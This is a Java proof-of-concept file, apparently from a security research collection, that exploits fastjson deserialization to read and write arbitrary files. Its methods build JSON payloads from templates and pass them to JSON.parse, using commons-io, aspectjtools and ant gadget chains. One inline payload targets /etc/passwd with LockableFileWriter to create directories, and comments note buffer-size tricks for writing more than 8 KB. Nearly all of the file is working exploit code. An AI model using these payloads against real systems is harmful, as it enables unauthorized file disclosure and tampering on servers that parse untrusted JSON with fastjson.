package vul;

import com.alibaba.fastjson.JSON;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;

public class IoAttack {
    public static void main(String[] args) throws IOException {
        ioFinal();
    }

    // 正确时报错，读取错误时不报错
    public static void ioRead() throws IOException {
        String json = new String(Files.readAllBytes(Paths.get("poc/poc68/io/ioRead.json")));
        String bytes = "102,108,97";
        String url = "file:///D:/flag.txt";
        String replace = json.replace("${content}", bytes).replace("${url}", url);
        JSON.parse(replace);
    }

    // 长度要大于8192B，且只能写入8192B
    public static void writeIo1() throws IOException {
        String json = new String(Files.readAllBytes(Paths.get("poc/poc68/io/io1.json")));
        int i = 0;
        StringBuilder content = new StringBuilder();
        while (i < 4096){
            content.append("a");
            i = i + 1;
        }
        i = 0;
        while (i < 4099){
            content.append("b");
            i = i + 1;
        }
        String path = "D:/1tmp/123.txt";
        String replace = json.replace("${content}", content.toString()).replace("${path}", path);
        JSON.parse(replace);
    }

    // ommons-io-2.2 aspectjtools-1.9.6 commons-codec-1.6
    public static void writeIo4() throws IOException {
        String json = new String(Files.readAllBytes(Paths.get("poc/poc68/io/io4.json")), StandardCharsets.UTF_8);

        // 要写入的文件
        byte[] bytes = Files.readAllBytes(Paths.get("D:/flag.txt"));

        //写文本时要填充数据
        String content = new String(bytes, StandardCharsets.UTF_8);
        for (int i=0; i<8192; i++){
            content = content + "a";
        }

        byte[] bytesPadding = content.getBytes();
        String base64Content = Base64.getEncoder().encodeToString(bytesPadding);
        String path = "D:/1tmp/111.txt";

        String format = String.format(json, base64Content, path, Arrays.toString(bytesPadding));
        JSON.parse(format);
    }

    // ommons-io-2.2 ant commons-codec-1.6
    public static void writeIo5() throws IOException {
        // 目录创建
        String mkdir = "{\n" +
                " \"@type\":\"java.lang.AutoCloseable\",\n" +
                " \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
                " \"writer\":{\n" +
                " \"@type\":\"org.apache.commons.io.output.LockableFileWriter\",\n" +
                " \"file\":\"/etc/passwd\", //一个存在的文件\n" +
                " \"encoding\":\"UTF-8\",\n" +
                " \"append\": true,\n" +
                "\"lockDir\":\"/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\" //要创建的目录\n" +
                " },\n" +
                " \"charset\":\"UTF-8\",\n" +
                " \"bufferSize\": 8193,\n" +
                " \"writeImmediately\": true\n" +
                " }";

        String json = new String(Files.readAllBytes(Paths.get("poc/poc68/io/io5.json")), StandardCharsets.UTF_8);
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\flag.txt"));
        String content = Base64.getEncoder().encodeToString(bytes);
        String path = "D:/1tmp/111.txt";
        String string = Arrays.toString(bytes);
        String format = String.format(json, content, path, string);
        JSON.parse(format);
    }

    // java-chains生成，最终版，可写8kb以上二进制
    public static void ioFinal() throws IOException {
        String json = new String(Files.readAllBytes(Paths.get("poc/poc68/io/ioFinal.json")), StandardCharsets.UTF_8);
        byte[] bytes = Files.readAllBytes(Paths.get("D:/flag.txt"));
        String hexContent = bytesToHexString(bytes);
        String path = "D:/1tmp/111.txt";

        byte[] byteArray = new byte[bytes.length + 1];

        String replace = json.replace("${hexContent}", hexContent).replace("${path}", path).replace("${byteArray}", Arrays.toString(byteArray));

        JSON.parse(replace);
    }

    public static String bytesToHexString(byte[] bytes) {
        if (bytes == null) {
            return null;
        }
        StringBuilder sb = new StringBuilder(bytes.length * 4);
        for (byte b : bytes) {
            sb.append("\\x");
            String hex = Integer.toHexString(b & 0xff);
            if (hex.length() == 1) {
                sb.append("0");
            }
            sb.append(hex);
        }
        return sb.toString();
    }
}
